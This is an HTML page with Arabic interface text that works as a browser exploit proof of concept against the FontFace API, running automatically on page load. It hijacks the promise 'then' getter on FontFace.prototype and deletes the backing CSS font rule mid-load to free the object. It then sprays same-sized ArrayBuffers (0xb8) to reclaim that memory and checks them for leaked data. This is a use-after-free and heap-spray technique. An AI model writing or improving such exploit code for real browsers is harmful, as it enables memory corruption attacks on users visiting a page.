<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>تجاوز الجمود - فحص الـ Heap المستقر</title>
    <style>
        body { background-color: #121212; color: #e0e0e0; font-family: monospace; padding: 20px; }
        #custom-console { background-color: #000; border: 2px solid #00ffcc; height: 400px; overflow-y: scroll; padding: 15px; margin-top: 20px; }
        .log { margin-bottom: 8px; }
        .warn { color: #ffaa00; }
        .success { color: #00ff00; font-weight: bold; }
    </style>
    
    <style id="s">
        @font-face { font-family: x; src: url(nonexistent-font.woff); unicode-range: U+0042; }
    </style>
</head>
<body>

    <h2>مراقبة التداخل المباشر بدون جمود</h2>
    <div id="custom-console">[نظام المحاكاة نشط]: في انتظار استقرار المستند...</div>

    <script>
        const consoleElement = document.getElementById('custom-console');
        function screenLog(msg, type = "normal") {
            const entry = document.createElement('div');
            if (type === "warn") entry.className = 'log warn';
            else if (type === "success") entry.className = 'log success';
            else entry.className = 'log';
            entry.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
            consoleElement.appendChild(entry);
            consoleElement.scrollTop = consoleElement.scrollHeight;
        }

        var array_storage = [];

        function runSafeExploration() {
            consoleElement.innerHTML = "";
            screenLog("بدء تشغيل الفحص الآمن والمباشر لـ FontFace...");

            try {
                // إعداد الكائن الأساسي فوراً دون أي حشو مسبق لمنع تجميد المحرك
                let A = new FontFace('x', 'local(Helvetica)', { unicodeRange: 'U+0041' });
                document.fonts.add(A);
                void A.loaded;

                let fired = false;

                Object.defineProperty(FontFace.prototype, 'then', {
                    configurable: true,
                    get() {
                        if (!fired && this === A) {
                            fired = true;
                            screenLog("!! تم تفعيل الكمين المنطقي للـ Getter بنجاح !!", "warn");
                            
                            try {
                                document.getElementById('s').sheet.deleteRule(0);
                                screenLog("تم حذف قاعدة الخط الأصلية بنجاح.");
                            } catch(e) { screenLog("خطأ الحذف: " + e.message, "warn"); }
                            
                            // الاستبدال النوعي الفوري داخل الكمين بحجم كائن الـ FontFace الفعلي (0xb8)
                            screenLog("جاري حشو الذاكرة بالمصفوفات ذات الحجم المتطابق...");
                            for (let i = 0; i < 150; i++) {
                                let ab = new ArrayBuffer(0xb8);
                                array_storage.push(new Uint32Array(ab));
                            }
                            screenLog("اكتمل حقن المصفوفات البديلة بنجاح.");

                            // فحص محتويات المصفوفات بعد مهلة بسيطة لكسر آلية التخزين المؤقت
                            setTimeout(() => {
                                screenLog("جاري فحص محتويات المصفوفات البرمجية لوجود أي تداخل...");
                                let leak_found = false;
                                
                                for (let i = 0; i < array_storage.length; i++) {
                                    if (array_storage[i][0] !== 0 || array_storage[i][1] !== 0) {
                                        screenLog(`[تنبيه] تم رصد تغير في قيم المصفوفة رقم: ${i}`, "success");
                                        leak_found = true;
                                        break;
                                    }
                                }
                                
                                if (!leak_found) {
                                    screenLog("المصفوفات لا تزال صفراً. المتصفح حافظ على الفصل بين الجداول.");
                                }
                            }, 40);
                        }
                        return function(resolve) { if (resolve) resolve(); };
                    }
                });

                screenLog("إطلاق طلب التحميل عبر الـ Layout Pipeline...");
                document.fonts.load('1em x', 'AB');

            } catch (err) {
                screenLog("خطأ عام: " + err.message, "warn");
            }
        }

        window.onload = () => {
            screenLog("تم تحميل الصفحة تماماً. الانتظار 1.5 ثانية للاستقرار التام...");
            setTimeout(runSafeExploration, 1500);
        };
    </script>
</body>
</html>
